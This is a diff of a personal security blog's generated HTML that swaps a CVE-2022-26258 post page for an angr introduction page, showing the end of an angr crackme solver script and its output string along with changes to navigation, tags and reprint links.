+  <span class="token keyword">else</span><span class="token punctuation">:</span>
+    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>最后执行 scaffold00.py 得到需要输入的字符串”JXWVXRKX”：</p>
+<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427000053246.png" alt="image-20220427000053246"></p>
 
                 
             </div>
@@ -623,7 +619,7 @@ ccp_act&#x3D;§set§&amp;old_ip&#x3D;§192.168.0.1§&amp;old_mask&#x3D;§255.255
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://unrav31.github.io/2022/04/25/cve-2022-26258-ming-ling-zhi-xing-lou-dong/">https://unrav31.github.io/2022/04/25/cve-2022-26258-ming-ling-zhi-xing-lou-dong/</a>
+                    <a href="https://unrav31.github.io/2022/04/26/angr-ru-men/">https://unrav31.github.io/2022/04/26/angr-ru-men/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -661,8 +657,8 @@ ccp_act&#x3D;§set§&amp;old_ip&#x3D;§192.168.0.1§&amp;old_mask&#x3D;§255.255
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CVE/">
-                                    <span class="chip bg-color">CVE</span>
+                                <a href="/tags/symbolic-execution/">
+                                    <span class="chip bg-color">symbolic execution</span>
                                 </a>
                             
                         </div>
@@ -710,9 +706,10 @@ ccp_act&#x3D;§set§&amp;old_ip&#x3D;§192.168.0.1§&amp;old_mask&#x3D;§255.255
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/04/26/angr-ru-men/">
                     <div class="card-image">
@@ -730,9 +727,9 @@ ccp_act&#x3D;§set§&amp;old_ip&#x3D;§192.168.0.1§&amp;old_mask&#x3D;§255.255
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-04-26
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-26
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -741,6 +738,7 @@ ccp_act&#x3D;§set§&amp;old_ip&#x3D;§192.168.0.1§&amp;old_mask&#x3D;§255.255
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -759,13 +757,13 @@ ccp_act&#x3D;§set§&amp;old_ip&#x3D;§192.168.0.1§&amp;old_mask&#x3D;§255.255
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/04/24/hexo-da-jian-bo-ke/">
+                <a href="/2022/04/25/cve-2022-26258-ming-ling-zhi-xing-lou-dong/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="Hexo搭建博客">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="CVE-2022-26258 命令执行漏洞">
                         
-                        <span class="card-title">Hexo搭建博客</span>
+                        <span class="card-title">CVE-2022-26258 命令执行漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -776,7 +774,7 @@ ccp_act&#x3D;§set§&amp;old_ip&#x3D;§192.168.0.1§&amp;old_mask&#x3D;§255.255
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-25
                             </span>
                         <span class="publish-author">
                             
@@ -789,8 +787,8 @@ ccp_act&#x3D;§set§&amp;old_ip&#x3D;§192.168.0.1§&amp;old_mask&#x3D;§255.255
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83/">
-                        <span class="chip bg-color">安装环境</span>
+                    <a href="/tags/CVE/">
+                        <span class="chip bg-color">CVE</span>
                     </a>
                     
                 </div>
